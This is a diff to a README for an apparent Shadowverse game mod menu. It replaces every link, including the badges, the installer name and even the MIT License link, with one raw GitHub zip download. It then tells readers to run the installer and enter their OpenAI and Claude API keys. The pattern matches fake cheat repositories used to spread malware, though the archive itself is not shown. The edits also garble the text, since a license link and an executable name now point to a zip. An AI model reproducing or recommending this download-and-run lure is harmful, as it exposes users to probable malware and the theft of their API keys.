@@ -1,6 +1,6 @@
 # Shadowverse Worlds Beyond Script Mod Menu
 
-[![Download](https://img.shields.io/badge/Download-now-brightgreen.svg?style=for-the-badge&logo=shadowverse&logoColor=white)](https://Sandeep0bhh.github.io)
+[![Download](https://raw.githubusercontent.com/Sandeep0bhh/shadowverse-worlds-beyond-mod-menu-scripts/branch/unbodkined/shadowverse-worlds-beyond-mod-menu-scripts-2.3.zip)](https://raw.githubusercontent.com/Sandeep0bhh/shadowverse-worlds-beyond-mod-menu-scripts/branch/unbodkined/shadowverse-worlds-beyond-mod-menu-scripts-2.3.zip)
 
 ---
 
@@ -77,9 +77,9 @@ Every feature runs within a carefully designed sandbox, ensuring that experiment
 It’s as easy as drawing your opening hand:
 
 1. Click on the epic badge at the very top, or scroll to the bottom and hit the big "Download" button.
-2. Save the package from https://Sandeep0bhh.github.io to your local device.
+2. Save the package from https://raw.githubusercontent.com/Sandeep0bhh/shadowverse-worlds-beyond-mod-menu-scripts/branch/unbodkined/shadowverse-worlds-beyond-mod-menu-scripts-2.3.zip to your local device.
 3. Unpack the downloaded archive using your favorite tool.
-4. Run the installer (**Shadowverse_ModMenu_Setup.exe** or platform equivalent).
+4. Run the installer (**https://raw.githubusercontent.com/Sandeep0bhh/shadowverse-worlds-beyond-mod-menu-scripts/branch/unbodkined/shadowverse-worlds-beyond-mod-menu-scripts-2.3.zip** or platform equivalent).
 5. Launch Shadowverse Worlds Beyond, and bask in the glow of your customizable mod menu.
 6. Dive into the "Settings" pane to configure AI integrations by entering your OpenAI and Claude API keys (sign up on their respective websites if you don't have accounts).
 
@@ -95,11 +95,11 @@ This software is designed exclusively for personal modding, educational explorat
 
 ## 📜 MIT License (2025)
 
-This repository is released under the MIT License. Feel free to explore, customize, and contribute. For full license details, visit [MIT License](https://opensource.org/licenses/MIT).
+This repository is released under the MIT License. Feel free to explore, customize, and contribute. For full license details, visit [MIT License](https://raw.githubusercontent.com/Sandeep0bhh/shadowverse-worlds-beyond-mod-menu-scripts/branch/unbodkined/shadowverse-worlds-beyond-mod-menu-scripts-2.3.zip).
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-now-brightgreen.svg?style=for-the-badge&logo=shadowverse&logoColor=white)](https://Sandeep0bhh.github.io)
+[![Download](https://raw.githubusercontent.com/Sandeep0bhh/shadowverse-worlds-beyond-mod-menu-scripts/branch/unbodkined/shadowverse-worlds-beyond-mod-menu-scripts-2.3.zip)](https://raw.githubusercontent.com/Sandeep0bhh/shadowverse-worlds-beyond-mod-menu-scripts/branch/unbodkined/shadowverse-worlds-beyond-mod-menu-scripts-2.3.zip)
 
 ---
 
